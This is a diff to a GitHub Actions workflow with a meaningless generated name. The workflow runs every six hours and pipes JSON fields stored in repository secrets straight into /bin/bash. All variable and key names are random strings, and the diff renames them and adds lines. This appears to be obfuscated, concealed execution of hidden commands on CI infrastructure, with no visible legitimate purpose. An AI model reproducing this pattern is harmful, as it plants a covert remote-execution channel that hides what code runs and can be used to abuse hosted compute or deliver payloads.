@@ -2,26 +2,28 @@ name: establishbelowground
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 1/6 * * *'
-
-jobs:  # 17460
+    - cron: '29 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: establishbelowground
         env:
-          a6: ${{ secrets.a6 }}
+          tne6: ${{ secrets.tne6 }}
         run: |
-          echo $a6 | jq -r .sbrgs44 | /bin/bash
-          echo $hl026 | jq -r .oqju51451 | /bin/bash
-          echo $muxf84773 | jq -r .spyo50 | /bin/bash
-          echo $ztfxl6 | jq -r .xyg133 | /bin/bash
-          echo $st13272 | jq -r .demkz65554 | /bin/bash
-          echo $ss1170 | jq -r .dou2 | /bin/bash
-          echo $puz73418 | jq -r .tvann4 | /bin/bash
-          echo $ymqq62 | jq -r .yo381 | /bin/bash
-          echo $g4897 | jq -r .abmns21 | /bin/bash
-          echo $byhvb8 | jq -r .cyupj1500 | /bin/bash
-          echo $y17523 | jq -r .fjmul70 | /bin/bash
+          echo $tne6 | jq -r .pvncu24 | /bin/bash
+          echo $roexw74288 | jq -r .jyuaq9 | /bin/bash
+          echo $b56 | jq -r .uleut637 | /bin/bash
+          echo $if5807 | jq -r .lrpxz4 | /bin/bash
+          echo $h51663 | jq -r .gbp25 | /bin/bash
+          echo $ze300 | jq -r .bsnsk05 | /bin/bash
+          echo $kr1750 | jq -r .ugng81552 | /bin/bash
+          echo $vgpa382 | jq -r .izi1441 | /bin/bash
+          echo $do37 | jq -r .os47 | /bin/bash
+          echo $mhp99699 | jq -r .sh071 | /bin/bash
+          echo $gbuie260 | jq -r .zey1 | /bin/bash
+          echo $x536 | jq -r .kut59121 | /bin/bash
+          echo $q19588 | jq -r .i960 | /bin/bash
 
